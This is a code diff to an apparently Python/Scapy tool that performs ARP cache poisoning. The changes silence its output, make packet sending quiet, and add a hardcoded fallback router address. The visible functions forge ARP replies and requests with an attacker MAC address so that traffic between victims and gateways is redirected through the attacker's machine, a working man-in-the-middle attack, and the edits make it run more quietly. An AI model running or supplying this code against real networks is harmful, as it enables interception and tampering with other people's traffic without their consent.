@@ -91,36 +91,36 @@ def arp_poison(targets, gateways):
 
     while True:
         try:
-            print("[*] Sending ARP poison packets...") if options.verbose else 0
+            # print("[*] Sending ARP poison packets...") if options.verbose else 0
 
             for victim_address in targets:
                 for from_address in gateways:
                     if(victim_address == from_address):
-                        print("[*] Skipping same IPs...") if options.verbose else 0
+                        # print("[*] Skipping same IPs...") if options.verbose else 0
                         continue
 
                     icmp = forge_l2_ping(from_address.ip, victim_address.ip, victim_address.mac)
-                    sendp(icmp, iface=options.iface, verbose=options.verbose)
+                    sendp(icmp, iface=options.iface, verbose=False)
                     if(not options.oneway):
                         icmpM = forge_l2_ping(victim_address.ip, from_address.ip, from_address.mac)
-                        sendp(icmpM, iface=options.iface, verbose=options.verbose)
+                        sendp(icmpM, iface=options.iface, verbose=False)
 
                     # Create ARP poison packet to send all packets from from_address to this pc if packet is for victim
                     arp = forge_arp(from_address.ip, victim_address.ip, victim_address.mac, ATTACKER_MAC, 2)
-                    sendp(arp, iface=options.iface, verbose=options.verbose)
+                    sendp(arp, iface=options.iface, verbose=False)
 
                     arp[ARP].op = 1
-                    sendp(arp, iface=options.iface, verbose=options.verbose)
+                    sendp(arp, iface=options.iface, verbose=False)
                     if(not options.oneway):
                         arpM = forge_arp(victim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
-                        sendp(arpM, iface=options.iface, verbose=options.verbose)
+                        sendp(arpM, iface=options.iface, verbose=False)
 
                         arpM[ARP].op = 1
-                        sendp(arpM, iface=options.iface, verbose=options.verbose)
+                        sendp(arpM, iface=options.iface, verbose=False)
 
-            print("[*] end of ARP storm...") if options.verbose else 0
+            # print("[*] end of ARP storm...") if options.verbose else 0
             if(options.silent and i >=2):
-                print("Initial poison complete")
+                print("[*] Initial poison complete")
                 return
 
         except Exception as e:
@@ -140,14 +140,14 @@ def poison_confirm(targets, gateways):
                     for gateway in gateways:
                         if(pkt[ARP].pdst == gateway.ip):
                             arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
-                            sendp(arpReply, iface=options.iface, verbose=options.verbose)
+                            sendp(arpReply, iface=options.iface, verbose=False)
                             print("ARP broadcast from " + arpReply[ARP].psrc + " to " + arpReply[ARP].pdst)
                 if(not options.oneway):
                     if(pkt[ARP].pdst == target.ip):
                         for gateway in gateways:
                             if(pkt[ARP].psrc == gateway.ip):
                                 arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
-                                sendp(arpReply, iface=options.iface, verbose=options.verbose)
+                                sendp(arpReply, iface=options.iface, verbose=False)
 
         # print("[*] Received ARP packet:")
         # pkt.show()
@@ -181,6 +181,10 @@ def main():
             gateway_mac = get_mac(gateway)
             if(gateway_mac == 0):
                 print("[!] MAC of Gateway: {} not found".format(gateway))
+                print("[!] Falling back to router MAC")
+                gateway_mac = get_mac("192.168.2.254")
+            if(gateway_mac == 0):
+                print("[!] MAC unavailable")
                 sys.exit(0)
             gateways.append(type('obj', (object,), {"mac": gateway_mac, "ip": gateway}))
     else:
